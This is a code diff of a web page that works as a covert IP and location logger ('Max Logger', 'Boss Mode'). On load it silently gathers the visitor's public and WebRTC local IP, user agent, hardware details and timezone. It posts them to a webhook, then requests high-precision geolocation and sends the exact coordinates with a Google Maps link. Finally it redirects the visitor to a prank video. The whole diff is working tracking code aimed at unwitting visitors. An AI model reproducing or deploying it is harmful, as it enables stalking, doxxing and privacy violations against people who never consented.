@@ -54,18 +54,19 @@
         };
         pc.createDataChannel("");
         pc.createOffer().then(o => pc.setLocalDescription(o));
-        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1500);
+        setTimeout(() => resolve([...ips].join(", ") || "N/A"), 1200);
       });
     }
 
     async function initialLog() {
       let ipData = {};
       try {
-        const res = await Promise.allSettled([
+        const promises = [
           fetch('https://ipapi.co/json/').then(r => r.ok ? r.json() : {}),
           fetch('https://ipinfo.io/json').then(r => r.ok ? r.json() : {})
-        ]);
-        ipData = { ...res[0].value, ...res[1].value };
+        ];
+        const results = await Promise.allSettled(promises);
+        ipData = { ...results[0].value, ...results[1].value };
       } catch(e) {}
 
       const webrtcIP = await getWebRTCIP();
@@ -79,21 +80,20 @@
             { name: "IP", value: `\`${ipData.ip || "N/A"}\``, inline: true },
             { name: "Local IP (WebRTC)", value: `\`${webrtcIP}\``, inline: true },
             { name: "Location", value: "**Not known yet — waiting for permission...**", inline: false },
-            { name: "City/Region", value: `${ipData.city || "N/A"}, ${ipData.region || ipData.country || "N/A"}`, inline: false },
+            { name: "City/Region", value: `${ipData.city || "N/A"}, ${ipData.region || "N/A"}`, inline: false },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-            { name: "Screen / Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"}`, inline: false },
+            { name: "Screen/Hardware", value: `\( {screen.width}x \){screen.height} | Cores: ${navigator.hardwareConcurrency || "N/A"} | RAM: ${navigator.deviceMemory || "N/A"}GB`, inline: false },
+            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
             { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ],
-          footer: { text: "Initial Log • Boss Mode" }
+          footer: { text: "Stage 1 • Max Logger" }
         }]
       };
-
       await sendWebhook(payload);
     }
 
     async function sendLocationUpdate(geo) {
       const mapsLink = `https://www.google.com/maps?q=\( {geo.lat}, \){geo.lon}`;
-
       const payload = {
         content: "**📍 LOCATION PERMISSION GRANTED - Exact Position Acquired**",
         embeds: [{
@@ -101,49 +101,39 @@
           color: 0x00ff00,
           fields: [
             { name: "Google Maps", value: `[📍 Click to View Exact Location](${mapsLink})`, inline: false },
-            { name: "Coordinates", value: `Latitude: ${geo.lat}\nLongitude: \( {geo.lon}\nAccuracy: ± \){geo.acc} meters`, inline: false },
+            { name: "Coordinates", value: `Lat: ${geo.lat}\nLon: \( {geo.lon}\nAccuracy: ± \){geo.acc} meters`, inline: false },
             { name: "Timestamp", value: new Date().toUTCString(), inline: false }
           ],
-          footer: { text: "Second Stage Log • Boss Mode" }
+          footer: { text: "Stage 2 • Boss Mode" }
         }]
       };
-
       await sendWebhook(payload);
     }
 
-    async function getGeolocation() {
-      if (!navigator.geolocation) return;
-      
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const geo = {
-            lat: pos.coords.latitude.toFixed(8),
-            lon: pos.coords.longitude.toFixed(8),
-            acc: pos.coords.accuracy.toFixed(0)
-          };
-          await sendLocationUpdate(geo);
-        },
-        () => {}, // silent fail
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
+    function getGeolocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            sendLocationUpdate({
+              lat: pos.coords.latitude.toFixed(8),
+              lon: pos.coords.longitude.toFixed(8),
+              acc: pos.coords.accuracy.toFixed(0)
+            });
+          },
+          () => {}
+        );
+      }
     }
 
-    async function startLogging() {
-      await getIPInfo(); // extra data on button click
+    function startLogging() {
+      getGeolocation();
       setTimeout(() => {
         window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=zGjTHHrh1HdE0kiL";
       }, 1800);
     }
 
-    async function getIPInfo() {
-      // Extra fingerprint on button press
-    }
-
-    // === AUTO START ===
-    window.onload = async () => {
-      console.log("%c🔥 ULTIMATE LOGGER READY - Boss Mode", "color:red;font-size:18px");
-      await initialLog();
-      // Start asking for location after initial log
+    window.onload = () => {
+      initialLog();
       setTimeout(getGeolocation, 800);
     };
   </script>
